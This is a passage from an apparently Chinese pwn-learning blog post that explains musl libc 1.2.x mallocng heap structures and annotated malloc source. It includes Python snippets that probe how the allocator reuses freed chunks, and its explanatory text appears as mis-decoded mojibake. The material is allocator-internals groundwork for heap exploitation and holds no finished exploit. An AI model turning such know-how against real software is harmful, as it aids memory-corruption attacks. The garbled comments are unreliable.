class="comment">//è¿™é‡Œå¥½åƒè¢«freeçš„chunkå…¶freed_maskå¯¹åº”çš„bitä¼šé©¬ä¸Šè¢«ç½®ä¸º1</span></span><br><span class="line">    <span class="comment">//ä½†æ˜¯avail_maskå¯¹åº”çš„bitå´ä¸ä¼šé©¬ä¸Šç½®1ï¼Œæš‚æ—¶æ ‡è®°ä¸å¯ç”¨çŠ¶æ€</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">//groupä¸­æœ€åä¸€ä¸ªchunkçš„idxç´¢å¼• (5bit)</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">//è¡¨ç¤ºå½“å‰metaæ˜¯å¦å¯ä»¥è¢«free(1:å¯ä»¥ï¼Œ0:ä¸å¯ä»¥)(1bit)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ç”±äºä¸€ä¸ªGroupä¸­çš„chunkçš„sizeåœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡sizeclassæ¥è¿½è¸ªè®¡ç®—size</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//(6bit)</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-meta-area"   >
          <a href="#4-meta-area" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-meta-area" class="headerlink" title="(4)meta_area"></a>(4)meta_area</h3>
      <p>é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªç»“æ„å°±æ˜¯ç”¨æ¥ç®¡ç†metaçš„ï¼Œç›¸å…³å®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;   		<span class="comment">//æ ¡éªŒå€¼</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">//ä¸‹ä¸€ä¸ªåˆ†é…åŒºï¼Œå³ä¸‹ä¸€é¡µ(0x1000ä¸ºä¸€é¡µ)</span></span><br><span class="line">    <span class="keyword">int</span> nslots;    			<span class="comment">//æ€»å…±å¤šå°‘ä¸ªslots</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> 	<span class="comment">//ä»å…¶ä¸­ç´¢å¼•å…¶ä¸‹é¢çš„meta</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>åˆ†é…metaæ—¶, æ€»æ˜¯å…ˆåˆ†é…ä¸€é¡µçš„å†…å­˜, ç„¶ååˆ’åˆ†ä¸ºå¤šä¸ªç­‰å¾…åˆ†é…çš„metaåŒºåŸŸï¼Œmeta_arenaæè¿°çš„å°±æ˜¯ä¸€é¡µå†…å­˜çš„æœ€å¼€å§‹éƒ¨åˆ†ã€‚</p>

        <h3 id="5-malloc-context"   >
          <a href="#5-malloc-context" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-malloc-context" class="headerlink" title="(5)malloc_context"></a>(5)malloc_context</h3>
      <p>è¿™ä¸ªå°±ç›¸å½“äºæ•´ä¸ªåˆ†é…å†…å­˜æœºåˆ¶æ€»ç®¡ç†çš„ä¸€ä¸ªç»“æ„ï¼Œç±»ä¼¼äºglibcä¸­çš„<code>main_arena</code>ç›¸å…³å®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;     <span class="comment">//æœ‰æ— å®Œæˆåˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;   <span class="comment">//mmapå†…å­˜æ€»æ•°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span> <span class="comment">//é‡Šæ”¾çš„metaç»„æˆçš„é˜Ÿåˆ—</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span>  <span class="comment">//æŒ‡å‘å¯ç”¨metaå¯¹è±¡</span></span><br><span class="line">    <span class="comment">//å¯ç”¨metaè®¡æ•°ã€å¯ç”¨meta_areaè®¡æ•°ã€ä¸çŸ¥é“</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">//åˆ†é…åŒºå¤´å°¾æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>   <span class="comment">//æ´»åŠ¨çš„meta</span></span><br><span class="line">    <span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>]; <span class="comment">//è¿™ä¸ªå¤§å°çº§åˆ«ä½¿ç”¨äº†å¤šå°‘å†…å­˜</span></span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></div></figure>

<p>æ€»çš„æ¥è¯´ï¼Œæ•°æ®ç»“æ„å¤§è‡´å¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png" alt="img"></p>

        <h2 id="2-ç»´æŠ¤æ–¹å¼-1"   >
          <a href="#2-ç»´æŠ¤æ–¹å¼-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»´æŠ¤æ–¹å¼-1" class="headerlink" title="2.ç»´æŠ¤æ–¹å¼"></a>2.ç»´æŠ¤æ–¹å¼</h2>
      <p>ä½¿ç”¨<code>freed_mask</code>å’Œ<code>avail_mask</code>æ¥ç¡®å®šï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨<code>active[2]</code>(å³sizeåœ¨0x1d~0x2cçš„chunk)ä¸­ç°åœ¨æœ‰</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png" alt="image-20220317141333259"></p>
<p>æˆ‘ä»¬å°†active[2]ä¸­<code>avail_mask</code>ç½®1çš„chunkéƒ½ç”³è¯·å‡ºæ¥ä¹‹åï¼Œå³ä»£è¡¨è¿™ä¸ªgroupæ— æ³•æ¥ç€ä¸ºæˆ‘ä»¬çš„ç”³è¯·æä¾›chunkçš„è¯ï¼Œæ¯”å¦‚è¿™é‡Œå°±æ˜¯éœ€è¦ç”³è¯·å‡ºchunk0~chunk9ï¼Œç„¶åå†ç”³è¯·çš„è¯å°±ä¼šè¿›è¡Œåˆ¤æ–­</p>
<ul>
<li>å¦‚æœè¯¥groupä¸­å­˜åœ¨è¢«freeçš„chunkï¼Œå³<code>freed_mask</code>ä¸­ç½®1çš„chunkï¼Œé‚£ä¹ˆå°±è¿”å›è¯¥chunkï¼Œè¿™é‡Œä¹Ÿå­˜åœ¨ä¸€ä¸ªé¡ºåºé—®é¢˜ï¼Œä¸ä¼šç®¡æ˜¯å…ˆé‡Šæ”¾è¿˜æ˜¯åé‡Šæ”¾çš„ï¼Œåªä¼šä»ä¸Šåˆ°ä¸‹è¿›è¡Œåˆ†é…ï¼Œå¦‚ä¸‹ä»£ç </li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">dbg()    </span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>ç¬¬ä¸€æ¬¡<code>dbg()</code>æ–­ç‚¹çš„åœ°æ–¹å…ˆç”³è¯·8ä¸ªchunkï¼Œé‚£ä¹ˆç°åœ¨åœ¨è¯¥groupçš„<code>avail_mask</code>ä¸­åº”è¯¥ä¸º<code>1100000000</code> è€Œ<code>freed_mask</code>åº”è¯¥ä¸º<code>1111111</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png" alt="image-20220317143430652"></p>
<p>æˆ‘ä»¬æ¥ç€ç”³è¯·ä¸¤ä¸ªChunkï¼Œåœ¨ç¬¬äºŒæ¬¡æ–­ç‚¹å¤„ï¼Œå…¶<code>avail_mask</code>åº”è¯¥ä¸º0ï¼Œè€Œ<code>freed_mask</code>ä¸å˜</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171438716.png"></p>
<p>è¿™æ—¶å€™å†ç”³è¯·ä¸€ä¸ªchunkï¼Œå³å¯ç”³è¯·å‡ºgroupä¸­ä»ä¸Šå¾€ä¸‹æ•°é¦–ä¸ªè¢«freeçš„chunkï¼Œè¿™æ—¶<code>freed_mask</code>è¢«æ¸…ç©ºï¼Œ<code>avail_mask</code>ä¾æ®<code>freed_mask</code>è¿›è¡Œé‡ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171442484.png" alt="image-20220317144243283"></p>
<p>å…¶å®æ€»è€Œè¨€ä¹‹å°±æ˜¯å½“è€—å°½groupä¸­çš„avail_maskå¯¹åº”çš„å¯ç”¨chunkä¹‹åï¼Œå†ç”³è¯·å°±ä¼šæ£€æµ‹è¯¥groupä¸­æ˜¯å¦å­˜åœ¨è¢«freeçš„chunkï¼Œå­˜åœ¨å°±ä¼šå¯¹è¢«freeçš„chunkè¿›è¡Œå¤„ç†ï¼Œå½’åˆ°availä¸­ï¼Œç›¸åº”çš„avail_maskå’Œfreed_maskå‘ç”Ÿå˜åŒ–ã€‚</p>
<p>è€Œå¦‚æœæˆ‘ä»¬æ”¹å˜é‡Šæ”¾é¡ºåºï¼Œä¾ç„¶ç”³è¯·å‡ºé¦–ä¸ªå¯ç”¨chunkï¼Œå’Œé‡Šæ”¾é¡ºåºæ— å…³</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">	free(i)</span><br><span class="line">dbg()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ•ˆæœ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171447956.png" alt="image-20220317144709749"></p>
<ul>
<li>å½“ç”³è¯·åˆ°è¯¥groupä¸­æ— å¯ç”¨chunkæ—¶ï¼Œå°è¯•ä»è¯¥sizeçš„metaé˜Ÿåˆ—ä¸­çš„å…¶ä»–metaå¯¹åº”çš„groupæ¥ç”³è¯·chunkã€‚</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i+<span class="number">11</span>,<span class="number">0x10</span>,p8(i+<span class="number">11</span>)*<span class="number">0x10</span>)</span><br><span class="line">dbg()</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬åœ¨ç”³è¯·å‡ºå¦å¤–ä¸€ä¸ªmeta-group(meta1)ä¹‹åï¼Œfreeæ‰ç¬¬ä¸€ä¸ªmeta-group(meta0)ä¸­çš„Chunkï¼Œç„¶åå½“æˆ‘ä»¬æ¶ˆè€—å®Œmeta1ä¸­çš„ç©ºé—´ä¹‹åï¼Œå†ç”³è¯·chunkçš„è¯ä¼šæ£€æµ‹è¯¥sizeçš„metaé˜Ÿåˆ—ï¼Œè¯•å›¾ä»ä¸­ç”³è¯·chunkå‡ºæ¥ï¼Œå¦‚ä¸‹å›¾å³ä»meta0ä¸­ç”³è¯·å‡ºæˆ‘ä»¬åˆšåˆšé‡Šæ”¾çš„Chunkã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171531940.png" alt="image-20220317153130762"></p>
<ul>
<li>å½“è¯¥sizeçš„metaé˜Ÿåˆ—ä¸­æ— availçš„chunkæ— freeçš„chunkæ—¶ï¼Œå°±ä¼šå†åˆ†é…ä¸€ä¸ª<code>meta-group</code>æ¥è¿›è¡Œå†åˆ†é…</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">dbg()</span><br></pre></td></tr></table></div></figure>

<p>åŸæ¥çš„groupå·²ç»ä¸å¯ç”¨äº†ï¼Œæ‰€ä»¥æ–°åˆ†é…äº†ä¸€ä¸ªgroup</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171449585.png" alt="image-20220317144959413"></p>

        <h2 id="3-å…³é”®å‡½æ•°-1"   >
          <a href="#3-å…³é”®å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…³é”®å‡½æ•°-1" class="headerlink" title="3.å…³é”®å‡½æ•°"></a>3.å…³é”®å‡½æ•°</h2>
      
        <h3 id="1-malloc"   >
          <a href="#1-malloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-malloc" class="headerlink" title="(1)malloc"></a>(1)malloc</h3>
      <p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929#h2-3" >musl-1.2.xå †éƒ¨åˆ†æºç åˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-4" >ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1  /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//æ˜¯å¦è¶…è¿‡ç”³è¯·çš„æœ€å¤§å€¼ï¼Œè¿™ä¸ªæœ€å¤§å€¼ä¸çŸ¥é“å¤šå°‘</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    static inline int size_overflows(size_t n)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (n &gt;= SIZE_MAX/2 - 4096) &#123;</span></span><br><span class="line"><span class="comment">            errno = ENOMEM;</span></span><br><span class="line"><span class="comment">            return 1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> mask, first;</span><br><span class="line">	<span class="keyword">int</span> sc;</span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line">	<span class="keyword">int</span> ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mmapåˆ†é…  #define MMAP_THRESHOLD 131052(0x1FFEC)</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="keyword">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//è®°å½•åˆ†é…ä¿¡æ¯</span></span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;<span class="comment">//metaçš„sizeclassä¸º63ä»£è¡¨mmapåˆ†é…</span></span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">        <span class="comment">//è®°å½•åˆ†é…ä¸ªæ•°</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¯»æ‰¾sizeå¯¹åº”çš„metaï¼Œctx.active[sc]</span></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line">	rdlock();</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    <span class="comment">//å¯¹åº”sizeçš„metaä¸ºç©ºä¸”4=&lt;sc&lt;=32ä¸”ä¸ç­‰äº6ä¸”ä¸ºå¶æ•°å¹¶ä¸”è¯¥scæ²¡æœ‰æ­£åœ¨ä½¿ç”¨çš„chunk</span></span><br><span class="line">    <span class="comment">//é‚£ä¹ˆç”³è¯·çš„chunkå°±ä¼šä»sc+1å¼€å§‹ç”³è¯·ï¼Œæ¯”å¦‚ç”³è¯·0x8cï¼Œå¯¹åº”çš„scåº”è¯¥æ˜¯8ï¼Œä½†æ˜¯ç”±äº</span></span><br><span class="line">    <span class="comment">//æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œscä¸º8çš„metaæ²¡æœ‰æ­£åœ¨ä½¿ç”¨çš„chunkï¼Œå¯¹åº”å°±ä¼šä»sc+1=9å¤„å¼€å§‹ç”³è¯·</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å–åˆ°avail_maskæœ€ä½ä½çš„1ï¼Œç½®é›¶ä¹‹åè®¡ç®—idx</span></span><br><span class="line">    <span class="comment">//æ ¹æ®idxä»groupä¸­å¯»æ‰¾å¯ç”¨chunk</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//metaä¸­çš„å¯ç”¨å†…å­˜çš„bitmap, å¦‚æœgä¸º0é‚£ä¹ˆå°±è®¾ä¸º0, è¡¨ç¤ºæ²¡æœ‰å¯ç”¨chunk</span></span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//æ‰¾åˆ°avail_maskçš„bitä¸­ç¬¬ä¸€ä¸ªä¸º1çš„bit</span></span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">        <span class="comment">//å¦‚æœæ²¡æ‰¾åˆ°å°±åœæ­¢</span></span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//è®¾ç½®avail_maskä¸­firstå¯¹åº”çš„bitä¸º0</span></span><br><span class="line">        <span class="comment">//ä¸‹é¢æ˜¯é”æœºåˆ¶ï¼Œä¸å¤ªæ‡‚</span></span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//æ‰¾åˆ°ä¹‹åè®¾ç½®avail_maskä¹‹åè½¬ä¸ºidx, ç»“æŸ</span></span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span 